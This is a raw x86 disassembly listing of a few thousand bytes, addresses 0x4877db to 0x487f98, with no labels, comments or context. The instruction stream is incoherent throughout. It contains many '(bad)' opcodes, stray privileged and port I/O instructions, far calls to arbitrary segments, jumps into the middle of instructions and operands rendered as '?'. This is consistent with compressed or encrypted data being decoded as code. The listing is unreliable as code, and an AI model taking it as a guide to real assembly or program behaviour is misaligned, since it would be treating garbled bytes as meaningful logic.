  4877db:	stos   BYTE PTR es:[edi],al
  4877dc:	pop    edx
  4877dd:	test   al,0x9b
  4877df:	repnz (bad) 
  4877e1:	fwait
  4877e2:	rol    BYTE PTR [ebx+0x724002c0],cl
  4877e8:	cmp    bh,BYTE PTR [edi]
  4877ea:	xchg   eax,esi
  4877ec:	push   edi
  4877ed:	mov    esp,0x111c8817
  4877f2:	jmp    DWORD PTR [esp+eax*1-0x1dfb39f1]
  4877f9:	(bad)  
  4877fa:	jecxz  0x48786b
  4877fc:	in     al,dx
  4877fd:	jmp    0x487782
  4877ff:	lea    edx,[ebp-0x1]
  487802:	push   edx
  487803:	mov    ebx,0x60c7be8
  487808:	xor    eax,0xafee074
  48780d:	add    cl,BYTE PTR [edx]
  48780f:	mov    ds:0xd37fc057,al
  487814:	mov    BYTE PTR [edx-0x52a435a2],ah
  48781a:	sbb    DWORD PTR [esi-0x76ffeb73],0xe6daecd8
  487824:	push   edi
  487825:	or     BYTE PTR [ebx+0x29fac13b],cl
  48782b:	inc    esi
  48782c:	mov    edx,0x6af0e030
  487831:	icebp  
  487832:	adc    DWORD PTR [esi+0x78],esp
  487835:	and    al,BYTE PTR [ecx+0x23c9e50f]
  48783b:	mov    dh,0xbb
  48783d:	and    al,0x74
  48783f:	jo     0x487883
  487841:	push   edx
  487842:	push   ecx
  487843:	cs inc ebp
  487845:	lock jge 0x487859
  487848:	push   edi
  487849:	repnz rcl BYTE PTR [ebx-0x529a0fa4],0xf0
  487851:	loop   0x4877d5
  487853:	pop    es
  487854:	add    al,0x28
  487856:	sub    ecx,esi
  487858:	push   0xffffffa6
  48785a:	cld    
  48785b:	cmp    dl,BYTE PTR [eax]
  48785d:	call   0xb408:0x507668fa
  487864:	and    ecx,eax
  487866:	and    ebx,DWORD PTR [ebp-0x3e]
  487869:	pushw  ss
  48786b:	lock inc ebp
  48786d:	hlt    
  48786e:	fadd   DWORD PTR [ecx-0x10]
  487871:	pop    es
  487872:	cmp    dl,cl
  487874:	or     eax,DWORD PTR [ecx+0x56]
  487877:	scas   al,BYTE PTR es:[edi]
  487878:	ss inc edx
  48787a:	push   eax
  48787b:	mov    esp,0x1c285c91
  487880:	pop    esi
  487881:	mov    WORD PTR [edi+eax*4+0xf],?
  487885:	mov    ebx,DWORD PTR [ebx-0x21]
  487888:	push   ecx
  487889:	fwait
  48788a:	je     0x4878f1
  48788c:	push   edi
  48788d:	les    edi,FWORD PTR [edi]
  48788f:	push   esp
  487890:	retf   0xf2d8
  487893:	pop    ds
  487894:	test   BYTE PTR [ebx],bh
  487896:	inc    esi
  487897:	or     BYTE PTR [edi+eiz*1+0xa],dh
  48789b:	jno    0x4878ae
  48789d:	mov    al,ds:0x48a8698
  4878a2:	adc    DWORD PTR [esi-0x78],edi
  4878a5:	or     ah,al
  4878a7:	fistp  QWORD PTR [edx+0x472cff74]
  4878ad:	cmp    edi,ebx
  4878af:	jb     0x487892
  4878b1:	add    DWORD PTR [esi+0x10],edi
  4878b4:	inc    esi
  4878b5:	add    eax,0x83c129f6
  4878ba:	push   esi
  4878bb:	test   al,0xc9
  4878bd:	inc    esi
  4878be:	and    BYTE PTR [esi],al
  4878c0:	loopne 0x4878e2
  4878c2:	das    
  4878c3:	aas    
  4878c4:	dec    ebp
  4878c5:	cld    
  4878c6:	push   ecx
  4878c7:	push   edx
  4878c8:	push   eax
  4878c9:	je     0x48789f
  4878cb:	popa   
  4878cc:	adc    eax,0xc7c6a78
  4878d1:	int    0xd6
  4878d3:	(bad)  
  4878d4:	jp     0x4878dd
  4878d6:	fwait
  4878d7:	shr    BYTE PTR [esi+0x7b],cl
  4878da:	jmp    0x487886
  4878dc:	push   esi
  4878dd:	adc    cl,BYTE PTR [eax]
  4878df:	and    eax,edx
  4878e1:	rol    BYTE PTR [eax+0x4cb02607],1
  4878e7:	ds mov edx,0x1629bc9e
  4878ed:	sbb    bl,BYTE PTR [eax-0x98040f3]
  4878f3:	dec    esi
  4878f4:	cmp    al,0x25
  4878f6:	and    BYTE PTR [edx+0x70],bl
  4878f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4878fa:	sub    eax,0x18233e22
  4878ff:	xor    edx,DWORD PTR [edx]
  487901:	inc    esi
  487902:	adc    ecx,DWORD PTR [ebx-0xf4a8111]
  487908:	push   ds
  487909:	(bad)  
  48790a:	cmp    edi,DWORD PTR [esi+0x16]
  48790d:	add    esi,0x2
  487910:	and    eax,0xff85ef75
  487915:	imul   ebp,DWORD PTR [ebp-0x66],0xd
  487919:	repnz arpl WORD PTR ds:0xbac35e5f,sp
  487920:	sar    DWORD PTR [ebp-0x59],cl
  487923:	mov    ch,0x20
  487925:	or     BYTE PTR [edi],ah
  487927:	data16 xor dl,BYTE PTR [eax+0x75]
  48792b:	xlat   BYTE PTR ds:[ebx]
  48792c:	aas    
  48792d:	pop    ss
  48792e:	mov    dh,0xcf
  487930:	push   ds
  487931:	mov    BYTE PTR [edx+0x6],bl
  487934:	dec    ecx
  487935:	inc    DWORD PTR [edx]
  487937:	jne    0x48793d
  487939:	mov    dh,0xeb
  48793b:	mov    esp,0xde0d0d80
  487940:	xor    al,0x75
  487942:	mov    eax,0xb12f02bf
  487947:	sbb    eax,DWORD PTR [esi]
  487949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48794a:	and    al,0xf
  48794c:	jg     0x487952
  48794e:	test   BYTE PTR [edi],0xa9
  487951:	adc    al,0x56
  487953:	or     DWORD PTR [eax+0x30e49cd],esp
  487959:	jl     0x487963
  48795b:	jnp    0x4878ee
  48795d:	imul   edx,DWORD PTR [eax],0x7f7d5f00
  487963:	cmp    ebp,edx
  487965:	sbb    al,0x78
  487967:	cmc    
  487968:	dec    edx
  487969:	cmp    BYTE PTR [esi-0xd],ah
  48796c:	je     0x487976
  48796e:	pop    esp
  48796f:	add    DWORD PTR [ecx+eax*2-0x9],ebx
  487973:	adc    eax,0x2a7f05af
  487978:	or     al,0x57
  48797a:	push   ebx
  48797b:	mov    DWORD PTR [edx-0x17],0x1404a0a
  487982:	pshufw mm1,QWORD PTR [eax],0x87
  487986:	clc    
  487987:	push   ebx
  487988:	push   edi
  487989:	mov    DWORD PTR [esi+0x27],ebp
  48798c:	into   
  48798d:	add    eax,0x3889189c
  487992:	mov    DWORD PTR [ecx+0x2a],edx
  487995:	idiv   BYTE PTR [eax-0x38]
  487998:	aam    0x4c
  48799a:	or     eax,0x10120848
  48799f:	cmp    esp,ebp
  4879a1:	jo     0x4879a5
  4879a3:	inc    edi
  4879a4:	cmp    edx,DWORD PTR [edi-0xed8efb2]
  4879aa:	jge    0x487987
  4879ac:	jmp    0x48794d
  4879ae:	out    0xdb,eax
  4879b0:	or     al,ah
  4879b2:	jmp    0x487941
  4879b4:	pop    ds
  4879b5:	or     dh,dl
  4879b7:	and    DWORD PTR [eax+ecx*1+0x7c],ecx
  4879bb:	js     0x487945
  4879bd:	je     0x487a37
  4879bf:	add    bl,BYTE PTR [ebx-0x1]
  4879c2:	inc    edi
  4879c3:	push   edi
  4879c4:	aas    
  4879c5:	ins    BYTE PTR es:[edi],dx
  4879c6:	test   BYTE PTR [edx],al
  4879c8:	add    DWORD PTR [ecx],0xffffff9e
  4879cb:	lea    eax,[ecx+0x5f]
  4879ce:	in     al,dx
  4879cf:	sbb    eax,0x9a9c086b
  4879d4:	push   ebx
  4879d5:	test   DWORD PTR [esi],0x70382d8
  4879db:	xor    DWORD PTR [ebp+0x1a715378],0x5b861848
  4879e5:	sbb    edx,DWORD PTR [edi]
  4879e7:	sub    ebp,DWORD PTR [ebx+esi*1+0x5b]
  4879eb:	xor    ah,BYTE PTR ds:0x8f678e2e
  4879f1:	mov    edi,0x668f7056
  4879f6:	test   al,0xc4
  4879f8:	icebp  
  4879f9:	mov    esi,0x3b08f240
  4879fe:	enter  0x6e02,0xdc
  487a02:	mov    WORD PTR [edi],?
  487a04:	mov    edi,0xf813cc51
  487a09:	(bad)  
  487a0a:	jge    0x487a2b
  487a0c:	ret    0x8916
  487a0f:	jle    0x487a15
  487a11:	add    edi,edi
  487a13:	push   edi
  487a14:	lea    ecx,[ebx+eax*2]
  487a17:	push   ecx
  487a18:	xor    eax,0x27e3785c
  487a1d:	mov    al,0x60
  487a1f:	xchg   BYTE PTR [edi+0x75d0759],bl
  487a25:	mov    ch,0x4
  487a27:	jp     0x487a7f
  487a29:	jb     0x487a61
  487a2b:	mov    ch,0xfc
  487a2d:	inc    eax
  487a2e:	pmuludq mm7,QWORD PTR [ebx+0x21]
  487a32:	(bad)  
  487a33:	lea    eax,[edi+0x1]
  487a36:	xchg   esi,eax
  487a37:	add    ebx,eax
  487a39:	inc    ebp
  487a3a:	sbb    al,0x6
  487a3c:	repnz push 0xffffffd8
  487a3f:	sub    al,0x14
  487a41:	pop    ss
  487a42:	dec    esp
  487a43:	mov    al,ds:0xa0bcdf44
  487a48:	repz push es
  487a4a:	sar    DWORD PTR [ebx+0x78d63e05],cl
  487a50:	inc    ecx
  487a51:	sar    DWORD PTR [ebx-0x1e7bfdcf],0x7f
  487a58:	es xchg edx,eax
  487a5a:	xor    eax,esp
  487a5c:	shl    BYTE PTR [eax+0x7b],0x4
  487a60:	dec    edx
  487a61:	test   DWORD PTR [ebx],edx
  487a63:	(bad)  
  487a64:	sbb    BYTE PTR [eax],ch
  487a66:	mov    al,0xc4
  487a68:	pop    esi
  487a69:	push   eax
  487a6a:	mov    DWORD PTR [ebx-0x3d],ebx
  487a6d:	and    eax,0x72003b3e
  487a72:	dec    esp
  487a73:	cmp    al,0x4b
  487a75:	or     BYTE PTR [edx+0xd6f99],bl
  487a7b:	inc    eax
  487a7c:	into   
  487a7d:	pop    esi
  487a7e:	fucom  st(3)
  487a80:	(bad)  
  487a81:	fidivr DWORD PTR [eax]
  487a83:	mov    bh,0xdf
  487a85:	lea    eax,[esi-0x59]
  487a88:	sub    al,0xfc
  487a8a:	popa   
  487a8b:	adc    eax,0xc2d6bca7
  487a90:	adc    al,0x1b
  487a92:	mov    dl,BYTE PTR [ebp+0xc]
  487a95:	mov    BYTE PTR [eax+0x18],dl
  487a98:	jo     0x487abf
  487a9a:	cmp    al,0x31
  487a9c:	test   eax,0xd2097880
  487aa1:	jne    0x487a6f
  487aa3:	xor    BYTE PTR [esi+0x380ae04d],al
  487aa9:	ret    
  487aaa:	mov    edi,0xc302650c
  487aaf:	xchg   ebp,eax
  487ab0:	lock lea esi,[eax+0x20]
  487ab4:	add    ebx,DWORD PTR [esi+0x372c8a9e]
  487aba:	jo     0x487ae4
  487abc:	cmp    eax,0x238669d
  487ac1:	and    eax,0x48885ff6
  487ac6:	xor    BYTE PTR [edi+0x1bd7f95f],bl
  487acc:	or     DWORD PTR [edx-0x5d],0x29
  487ad0:	pop    es
  487ad1:	aam    0xb6
  487ad3:	add    ch,bl
  487ad5:	push   ds
  487ad6:	imul   eax,DWORD PTR [ebx],0x548c83c7
  487adc:	mov    eax,DWORD PTR [ecx+0x1f]
  487adf:	fist   WORD PTR [eax]
  487ae1:	aas    
  487ae2:	mov    edx,0x8d5242cc
  487ae7:	xchg   DWORD PTR [esp+eiz*4+0x1e],edi
  487aeb:	xor    DWORD PTR [ebp+edi*4+0x75],ebp
  487aef:	jge    0x487af3
  487af1:	adc    al,0x58
  487af3:	ds push eax
  487af5:	or     al,BYTE PTR [eax+0x14]
  487af8:	push   esi
  487af9:	push   ecx
  487afa:	dec    edi
  487afb:	in     al,0xc6
  487afd:	call   FWORD PTR [edx+0xc]
  487b00:	add    DWORD PTR [ebx],eax
  487b02:	retf   
  487b03:	add    ecx,edi
  487b05:	call   edx
  487b07:	adc    DWORD PTR [edi-0x3d],ebx
  487b0a:	scas   al,BYTE PTR es:[edi]
  487b0b:	lahf   
  487b0c:	mov    esp,DWORD PTR [eax]
  487b0e:	or     eax,0xba92104
  487b13:	daa    
  487b14:	shl    cl,0x7c
  487b17:	pop    edx
  487b18:	lahf   
  487b19:	jge    0x487b66
  487b1b:	push   cs
  487b1c:	lahf   
  487b1d:	rol    BYTE PTR [esi+0x2e358480],0x9c
  487b24:	dec    edx
  487b25:	iret   
  487b26:	clc    
  487b27:	add    eax,0xacf340da
  487b2c:	mov    esp,0x427e1966
  487b31:	mov    edx,DWORD PTR [edi+0x1c]
  487b34:	inc    eax
  487b35:	jae    0x487b26
  487b37:	stos   BYTE PTR es:[edi],al
  487b38:	or     al,0x18
  487b3a:	push   0x1c
  487b3c:	mov    DWORD PTR [edi+0x1c],0x2d5f3883
  487b43:	imul   ebx,esi,0x184f193e
  487b49:	sub    al,0x1c
  487b4b:	mov    DWORD PTR [esi+0x18],ecx
  487b4e:	sbb    BYTE PTR [edi+ebp*2+0x1ce6748b],bh
  487b55:	sub    DWORD PTR [ebp-0x39],edx
  487b58:	xor    eax,0x1c52a788
  487b5d:	(bad)  
  487b5e:	mov    esi,0x1414d136
  487b63:	sbb    BYTE PTR [edi],bl
  487b65:	test   al,0x58
  487b67:	dec    ebx
  487b68:	jo     0x487bcf
  487b6a:	push   DWORD PTR cs:[eax]
  487b6d:	(bad)
  487b70:	pop    esp
  487b71:	push   0x20
  487b73:	xchg   DWORD PTR [edi+0x3b],ecx
  487b76:	not    BYTE PTR [eax]
  487b78:	mov    ah,BYTE PTR [esi+ecx*8]
  487b7b:	mov    eax,ds:0x8ba2f33b
  487b80:	ret    
  487b81:	ror    BYTE PTR [eax],1
  487b83:	xchg   edi,eax
  487b84:	jle    0x487b9f
  487b86:	sub    al,0x2c
  487b88:	inc    eax
  487b89:	sahf   
  487b8a:	push   esi
  487b8b:	icebp  
  487b8c:	cmp    eax,0x2955315d
  487b91:	arpl   WORD PTR [edx],di
  487b93:	test   eax,0x304c055c
  487b98:	fimul  DWORD PTR [edx]
  487b9a:	adc    al,0x33
  487b9c:	or     al,0x26
  487b9e:	neg    BYTE PTR [edi-0x4074873b]
  487ba4:	add    BYTE PTR ds:0x7895e9c,ch
  487baa:	pop    ebx
  487bab:	add    eax,0xb6ebf633
  487bb0:	mov    edx,0xa9d061dd
  487bb5:	inc    eax
  487bb6:	fistp  WORD PTR [eax]
  487bb8:	push   ebx
  487bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  487bba:	clc    
  487bbb:	test   al,0x68
  487bbd:	add    DWORD PTR [ecx+edi*1+0x5819a633],edx
  487bc4:	test   BYTE PTR ds:0x40da7ee4,0x4d
  487bcb:	pop    edx
  487bcc:	add    edx,edx
  487bce:	and    BYTE PTR [edx],dl
  487bd0:	mov    DWORD PTR ds:0x9c0957e0,esi
  487bd6:	jbe    0x487be2
  487bd8:	fsubr  QWORD PTR [edx]
  487bda:	les    ecx,FWORD PTR ds:0xcaa74742
  487be0:	hlt    
  487be1:	push   edi
  487be2:	xchg   ebx,eax
  487be3:	jo     0x487bd9
  487be5:	cmp    esp,DWORD PTR [edi-0x61]
  487be8:	push   ds
  487be9:	and    BYTE PTR [esi-0x70],dh
  487bec:	jmp    DWORD PTR [eax*4-0xec4f037]
  487bf3:	test   DWORD PTR [edx+0x3f],ecx
  487bf6:	loop   0x487c07
  487bf8:	xor    BYTE PTR [eax-0x2],0xd6
  487bfc:	test   edx,edx
  487bfe:	pop    edx
  487bff:	cmp    al,0x82
  487c01:	loop   0x487be0
  487c03:	xor    dl,BYTE PTR [edx]
  487c05:	dec    eax
  487c06:	sbb    BYTE PTR [esi+0x3b],ah
  487c09:	sbb    esi,edi
  487c0b:	or     BYTE PTR [esp+ebx*8],bl
  487c0e:	das    
  487c0f:	in     al,0x83
  487c11:	rol    DWORD PTR [edx],0x4a
  487c14:	jne    0x487c05
  487c16:	repnz sub cl,BYTE PTR [edi]
  487c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487c1a:	sar    BYTE PTR [edi+0x4d],cl
  487c1d:	pop    edx
  487c1e:	add    DWORD PTR cs:[eax],ebx
  487c21:	sbb    eax,eax
  487c23:	and    eax,0xfffffffe
  487c26:	inc    eax
  487c27:	add    al,0xae
  487c29:	mov    eax,0x8e6f876e
  487c2e:	js     0x487c87
  487c30:	jle    0x1c9803c3
  487c36:	test   eax,0xa04f1586
  487c3b:	sti    
  487c3c:	add    bh,BYTE PTR [edx]
  487c3e:	cmp    edx,esi
  487c40:	ja     0xb1152aae
  487c46:	daa    
  487c47:	imul   eax,DWORD PTR [edi+0x9ac7b40],0xbeffec14
  487c51:	adc    DWORD PTR [ecx+0x50906bbb],ecx
  487c57:	ret    
  487c58:	push   ss
  487c59:	ror    ah,0x3
  487c5c:	lahf   
  487c5d:	inc    ecx
  487c5e:	or     edi,DWORD PTR [edx]
  487c60:	jne    0x487c4b
  487c62:	clc    
  487c63:	push   0xffffff82
  487c65:	scas   eax,DWORD PTR es:[edi]
  487c66:	pop    ebp
  487c67:	adc    edx,DWORD PTR [esi]
  487c69:	pop    edi
  487c6a:	imul   esi,DWORD PTR [eax],0x39047259
  487c70:	cwde   
  487c71:	push   cs
  487c72:	add    BYTE PTR [edx],0xb8
  487c75:	jb     0x487c5f
  487c77:	cmp    esi,edx
  487c79:	into   
  487c7a:	ins    DWORD PTR es:[edi],dx
  487c7b:	or     dh,BYTE PTR [esi]
  487c7d:	or     DWORD PTR [ecx],0x28
  487c80:	shr    BYTE PTR [esi+0x104cec75],cl
  487c86:	js     0x487c7f
  487c88:	pop    ebx
  487c89:	outs   dx,BYTE PTR ds:[esi]
  487c8a:	adc    DWORD PTR [ebp+0x4f],esi
  487c8d:	test   ebp,ebp
  487c8f:	mov    edx,DWORD PTR [ecx+0x72]
  487c92:	aas    
  487c93:	jmp    0x487cea
  487c95:	scas   al,BYTE PTR es:[edi]
  487c96:	add    al,0x5e
  487c98:	jo     0x487cc6
  487c9a:	push   eax
  487c9b:	adc    ecx,DWORD PTR [ebx-0x7603e7be]
  487ca1:	inc    ecx
  487ca2:	sbb    al,0x1e
  487ca4:	call   0x18f0:0x1c15e9a6
  487cab:	mov    eax,ds:0x3ac8ba4f
  487cb0:	cld    
  487cb1:	xor    al,0xb
  487cb3:	mov    edx,DWORD PTR ds:0x16568a59
  487cb9:	mov    DWORD PTR [ecx+0x1c],edx
  487cbc:	mul    cl
  487cbe:	fimul  DWORD PTR [edi+edx*4]
  487cc1:	jae    0x487cf3
  487cc3:	jg     0x487cfc
  487cc5:	pushf  
  487cc6:	push   ecx
  487cc7:	push   cs
  487cc8:	cld    
  487cc9:	jne    0x487ca3
  487ccb:	out    0x3,al
  487ccd:	mov    DWORD PTR [edi+0x3b],eax
  487cd0:	and    DWORD PTR [edx],0xfffffffc
  487cd3:	scas   eax,DWORD PTR es:[edi]
  487cd4:	sub    BYTE PTR [ebp-0x10],dl
  487cd7:	mov    DWORD PTR [edx+0x41],ecx
  487cda:	inc    edi
  487cdb:	and    eax,0xae40fca1
  487ce0:	add    ecx,DWORD PTR [esi+0x4d]
  487ce3:	jae    0x487c9d
  487ce5:	imul   BYTE PTR [esi]
  487ce7:	fnsave [ebx-0x4e]
  487cea:	jg     0x487caf
  487cec:	mov    esi,0x9e891ca8
  487cf1:	jo     0x487ce4
  487cf3:	push   ds
  487cf4:	loopne 0x487d56
  487cf6:	sbb    al,0x2c
  487cf8:	jp     0x487cf5
  487cfa:	xor    esi,DWORD PTR [ecx+0x50daaf4a]
  487d00:	sbb    al,0x90
  487d02:	dec    eax
  487d03:	sbb    al,0xae
  487d05:	or     al,0x84
  487d07:	sbb    eax,0x55690bde
  487d0c:	mov    WORD PTR [ebx],gs
  487d0e:	loop   0x487d15
  487d10:	and    BYTE PTR [eax],ch
  487d12:	sbb    BYTE PTR [eax-0x6d857670],bh
  487d18:	popa   
  487d19:	aas    
  487d1a:	add    eax,0x12a85807
  487d1f:	je     0x487d35
  487d21:	mov    edx,DWORD PTR ds:0xf813f06d
  487d27:	sbb    ecx,ecx
  487d29:	and    ecx,0xfffffffe
  487d2c:	push   ds
  487d2d:	das    
  487d2e:	cmp    ah,al
  487d30:	push   0xb83a6b57
  487d35:	aas    
  487d36:	add    DWORD PTR [ebp-0x8],0x2
  487d3a:	inc    eax
  487d3b:	jmp    0x5d0a:0x37f206eb
  487d42:	and    DWORD PTR [edx-0x7dd8158],0x13
  487d49:	pop    ebx
  487d4a:	push   ds
  487d4b:	aas    
  487d4c:	ds xchg esp,eax
  487d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487d4f:	sub    cl,BYTE PTR ds:0x9707b945
  487d55:	aad    0xfa
  487d57:	inc    edi
  487d58:	dec    ecx
  487d59:	push   0x425c12
  487d5e:	inc    esp
  487d5f:	add    eax,DWORD PTR [esi]
  487d61:	call   DWORD PTR cs:[esi]
  487d64:	inc    edx
  487d65:	test   edx,eax
  487d67:	fistp  WORD PTR [edx+0x784fe079]
  487d6d:	pop    edi
  487d6e:	test   al,0x5
  487d70:	in     eax,dx
  487d71:	aas    
  487d72:	xor    ebx,ebx
  487d74:	lods   al,BYTE PTR ds:[esi]
  487d75:	loopne 0x487d93
  487d77:	cld    
  487d78:	jmp    0x487dc2
  487d7a:	cld    
  487d7b:	lea    eax,[edi+ebx*1]
  487d7e:	cdq    
  487d7f:	xor    BYTE PTR [ebp-0x3dd42e96],dl
  487d85:	enter  0xfed1,0x74
  487d89:	fwait
  487d8a:	add    bl,dl
  487d8c:	jecxz  0x487d20
  487d8e:	add    edi,ecx
  487d90:	mov    ds:0xae60778,eax
  487d95:	sbb    dh,bh
  487d97:	jbe    0x487d26
  487d99:	pop    esi
  487d9a:	add    DWORD PTR [edx-0x73],ebx
  487d9d:	jle    0x487d9e
  487d9f:	cmp    ebx,edi
  487da1:	jle    0x487d6e
  487da3:	xchg   edx,eax
  487da4:	sbb    dh,BYTE PTR [eax]
  487da6:	fnsave [edx+0x2]
  487da9:	fstp   DWORD PTR [esi]
  487dab:	jg     0x487d9d
  487dad:	pop    edi
  487dae:	mov    ah,0xd8
  487db0:	add    ecx,DWORD PTR [ebx+0xdff1d4b]
  487db6:	inc    esp
  487db7:	sub    BYTE PTR [ebx],dh
  487db9:	cmp    eax,0xc1f6283e
  487dbe:	add    esi,esp
  487dc0:	pop    eax
  487dc1:	push   cs
  487dc2:	lock lods eax,DWORD PTR ds:[esi]
  487dc4:	mov    ecx,0xf004f6d5
  487dc9:	(bad)  
  487dcb:	add    al,0x85
  487dcd:	cmp    BYTE PTR [esi],ch
  487dcf:	dec    ecx
  487dd0:	add    ch,bh
  487dd2:	test   DWORD PTR [ebx+0x62],0xc80bc57e
  487dd9:	mov    DWORD PTR [edi-0x47],edx
  487ddc:	push   0xef0045a7
  487de1:	dec    edx
  487de2:	gs repz adc al,0x2e
  487de6:	dec    ecx
  487de7:	mov    ds:0x655268a8,eax
  487dec:	inc    esi
  487ded:	sub    cl,BYTE PTR [ebp+edx*1+0x232b2a71]
  487df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  487df5:	mov    al,0xe4
  487df7:	into   
  487df8:	out    dx,al
  487df9:	dec    edi
  487dfa:	idiv   DWORD PTR [ecx-0x2be24c96]
  487e00:	xor    edx,edx
  487e02:	mov    ecx,0x4c35193b
  487e07:	sub    edx,DWORD PTR [edi+0x700ad2ef]
  487e0d:	xchg   esp,eax
  487e0e:	pop    ss
  487e0f:	mov    eax,0xeff80ddc
  487e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487e15:	xor    ebp,DWORD PTR [edx+eax*4]
  487e18:	or     esp,DWORD PTR [eax+ecx*2]
  487e1b:	das    
  487e1c:	fsub   DWORD PTR [ebx+esi*2-0x1b]
  487e20:	sti    
  487e21:	ds mov esi,0x2b1ce3e2
  487e27:	fs mov bh,0x33
  487e2a:	inc    edi
  487e2b:	xchg   esp,eax
  487e2c:	imul   BYTE PTR [ecx+0x6d]
  487e2f:	bound  ebx,QWORD PTR [edx-0x8]
  487e32:	push   edi
  487e33:	sub    al,0x40
  487e35:	xor    edi,edi
  487e37:	xor    BYTE PTR [eax+0x17d5b67d],cl
  487e3d:	sbb    al,0xbe
  487e3f:	sbb    al,0xa0
  487e41:	adc    eax,0x2a50a348
  487e46:	out    dx,eax
  487e47:	not    ebx
  487e49:	or     DWORD PTR [edi+eax*8+0x5],edx
  487e4d:	pop    esp
  487e4e:	or     dh,al
  487e50:	stos   BYTE PTR es:[edi],al
  487e51:	dec    eax
  487e52:	xor    ch,BYTE PTR [esp+esi*2-0x23]
  487e56:	in     eax,0xb9
  487e58:	push   esp
  487e59:	js     0x487ddb
  487e5b:	aam    0x90
  487e5d:	sub    DWORD PTR [eax+0x2e7779e5],ebx
  487e63:	pushf  
  487e64:	nop
  487e65:	cmp    al,0xa4
  487e67:	mov    ah,0xdf
  487e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487e6a:	ror    dh,cl
  487e6c:	mov    ah,0x48
  487e6e:	mov    esp,0x8c34c8c0
  487e73:	pop    edx
  487e74:	fisub  WORD PTR [ebp+0x29d82aeb]
  487e7a:	loopne 0x487eaf
  487e7c:	in     al,0xec
  487e7e:	push   0xd9f2b3a8
  487e83:	pop    ebp
  487e84:	cld    
  487e85:	xor    eax,DWORD PTR [edi+ebp*1]
  487e88:	or     BYTE PTR [edi],ch
  487e8a:	adc    BYTE PTR [edi],ch
  487e8c:	pop    esp
  487e8d:	sub    cl,bh
  487e8f:	dec    ebx
  487e90:	pushf  
  487e91:	and    BYTE PTR [edi],ch
  487e93:	sub    BYTE PTR [esp+esi*1],ch
  487e96:	pop    ds
  487e97:	pushf  
  487e98:	out    dx,eax
  487e99:	repnz mov WORD PTR [edi+ebx*1+0x4c],es
  487e9e:	xchg   edi,eax
  487e9f:	or     eax,0xf2e1db50
  487ea4:	jl     0x487ee5
  487ea6:	pop    eax
  487ea7:	sub    BYTE PTR [eax+0x15],0x3d
  487eab:	ins    BYTE PTR es:[edi],dx
  487eac:	jne    0x487f20
  487eae:	jns    0x487e6e
  487eb0:	scas   al,BYTE PTR es:[edi]
  487eb1:	jo     0x487ebc
  487eb3:	je     0x487ef4
  487eb5:	jl     0x487f17
  487eb7:	mov    WORD PTR [esi-0x6f1abc11],ds
  487ebd:	xchg   esp,eax
  487ebe:	imul   ebx,DWORD PTR [eax+0x333ca041],0x67
  487ec5:	js     0x487f46
  487ec7:	mov    edi,0x3e45a3ac
  487ecc:	lods   al,BYTE PTR ds:[esi]
  487ecd:	jae    0x487f0c
  487ecf:	mov    al,0x24
  487ed1:	iret   
  487ed2:	xchg   ebp,eax
  487ed3:	xchg   ebx,eax
  487ed4:	dec    ebx
  487ed5:	(bad)  
  487ed6:	rcl    ah,1
  487ed8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  487eda:	inc    esp
  487edb:	hlt    
  487edc:	and    ebx,DWORD PTR [edi+0x45f8272b]
  487ee2:	jno    0x487f2b
  487ee4:	sbb    BYTE PTR [eax],dh
  487ee6:	sbb    al,0x56
  487ee8:	dec    esi
  487ee9:	sahf   
  487eea:	lahf   
  487eeb:	xor    BYTE PTR ds:0x403c46ae,bh
  487ef1:	mov    dh,0xad
  487ef3:	test   eax,0x60549cac
  487ef8:	fs pushf 
  487efa:	stos   DWORD PTR es:[edi],eax
  487efb:	test   BYTE PTR [edx-0xe],dh
  487efe:	pop    esp
  487eff:	cmp    DWORD PTR [eax-0x57ba518c],ecx
  487f05:	lods   al,BYTE PTR ds:[esi]
  487f06:	xchg   edi,eax
  487f07:	retf   0xb2ad
  487f0a:	rep lods eax,DWORD PTR ds:[esi]
  487f0c:	int3   
  487f0d:	dec    ebx
  487f0e:	shl    BYTE PTR [edx],1
  487f10:	lock dec ebx
  487f12:	ja     0x487f85
  487f14:	outs   dx,BYTE PTR ds:[esi]
  487f15:	and    eax,0xb2f0ef4
  487f1a:	mov    eax,0x83cf8bcf
  487f1f:	mov    esp,0xaa18c4b3
  487f24:	adc    DWORD PTR [edi],ebp
  487f26:	fsubr  QWORD PTR [edi]
  487f28:	(bad)
  487f2b:	or     eax,esp
  487f2d:	xor    ebp,eax
  487f2f:	or     al,0x11
  487f31:	pop    edi
  487f32:	retf   
  487f33:	mov    di,WORD PTR [ebx+0x4358300]
  487f3a:	xor    BYTE PTR ds:0xa9fc300c,dl
  487f40:	xchg   edi,eax
  487f41:	out    0xeb,eax
  487f43:	sahf   
  487f44:	xor    BYTE PTR [ecx+ecx*1],ah
  487f47:	sub    BYTE PTR [ebx],dh
  487f49:	xor    al,ch
  487f4b:	inc    esp
  487f4c:	in     eax,0xb9
  487f4e:	push   esp
  487f4f:	sub    cl,BYTE PTR [eax+0x4c]
  487f52:	push   esp
  487f53:	aam    0xe5
  487f55:	stc    
  487f56:	jbe    0x487f37
  487f58:	push   0xd0b6c93
  487f5d:	jo     0x487f96
  487f5f:	js     0x487f15
  487f61:	retf   
  487f62:	repz jge 0x487f42
  487f65:	mov    WORD PTR [ecx-0x70],fs
  487f68:	inc    ecx
  487f69:	xchg   esp,eax
  487f6a:	xor    eax,0xe113a49c
  487f6f:	pop    esp
  487f70:	mov    esi,0xb8b42bb0
  487f75:	lods   al,BYTE PTR ds:[esi]
  487f76:	je     0x487f4f
  487f78:	push   ebp
  487f79:	cs iret 
  487f7b:	rcl    BYTE PTR [esp+edx*8+0x73dc09d8],0xbc
  487f83:	pop    esp
  487f84:	cs iret 
  487f86:	in     al,0x88
  487f88:	clc    
  487f89:	cld    
  487f8a:	add    BYTE PTR [ecx],dh
  487f8c:	retf   0x7b06
  487f8f:	or     DWORD PTR [eax],0x12
  487f92:	je     0x487fd2
  487f94:	push   edx
  487f95:	iret   
  487f96:	stos   DWORD PTR es:[edi],eax
  487f97:	leave  
  487f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
